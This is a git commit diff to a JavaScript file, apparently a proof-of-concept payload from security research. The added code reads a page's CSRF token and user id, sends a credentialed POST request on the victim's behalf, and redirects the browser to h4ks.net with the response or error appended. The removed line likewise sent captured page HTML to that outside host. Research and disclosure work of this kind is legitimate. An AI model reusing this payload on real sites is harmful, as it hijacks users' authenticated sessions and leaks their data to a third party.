e3d3d34605fbeae4932994e46fa158daf80d51ad
Robert Vulpe <nytr0gen.george@gmail.com>
2020-01-16 18:59:13 +0000

    Update test2.js

--- test2.js
+++ test2.js
@@ -3,7 +3,25 @@ try {
     x.onload = function () {
         try {
             var html = x.document.body.outerHTML;
-            location = '//h4ks.net/go/test?'+encodeURIComponent(html.slice(0, 300));
+            
+var csrf = document.getElementsByName('_csrf_token')[0].value;
+var name = encodeURIComponent(html);
+var userId = document.getElementsByName('__id')[0].value;
+fetch("", {
+    "credentials": "include",
+    "headers": {
+        "content-type": "application/x-www-form-urlencoded",
+    },
+    "method": "POST",
+    "body": "name=" + name + "&user_id=" + userId + "&_csrf_token=" + csrf,
+}).then(r => r.text())
+.then(body => {
+    location = '//h4ks.net/go/test2?'+encodeURIComponent(body);
+})
+.catch(err => {
+    location = '//h4ks.net/go/test2?'+encodeURIComponent(err.toString());
+})
+
         } catch (err) {
             location = '//h4ks.net/go/test?'+encodeURIComponent(err.toString());
         }
